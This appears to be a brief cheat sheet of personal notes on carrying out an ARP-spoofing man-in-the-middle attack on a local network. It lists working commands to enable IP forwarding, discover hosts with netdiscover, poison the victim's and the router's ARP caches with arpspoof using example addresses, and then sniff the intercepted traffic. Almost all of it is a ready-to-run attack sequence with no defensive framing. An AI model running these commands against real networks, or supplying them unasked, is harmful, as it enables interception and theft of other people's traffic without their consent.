ARPspoofing - ARP Spoofing with arpspoof

+ ARP - Address Resolution Protocol to resolve MAC addresses to IP addresses

+ To enable packet flow through your machine during MITM attack
	#sysctl -w net.ipv4.ip_forward=1

+ Using netdiscover to identify devices in the network
	#netdiscover -r [cidr of the network]
	#netdiscover -r 192.168.202.1/24

+ Tricking the target victim machine
	#arpspoof -i [interface name] -t [target ip address] [default gateway]
	#arpspoof -i eth0 -t 192.168.202.142 192.168.202.2
	
+ Tricking the router machine
	#arpspoof -i [interface name] -t [router ip address] [target ip address]
	#arpspoof -i eth0 -t 192.168.202.2 192.168.202.142
	
+ Now we are now actively MITM victim machine

+ To start sniffing packet you can use wireshark, tcpdump or any packet capture tool you're familiar with
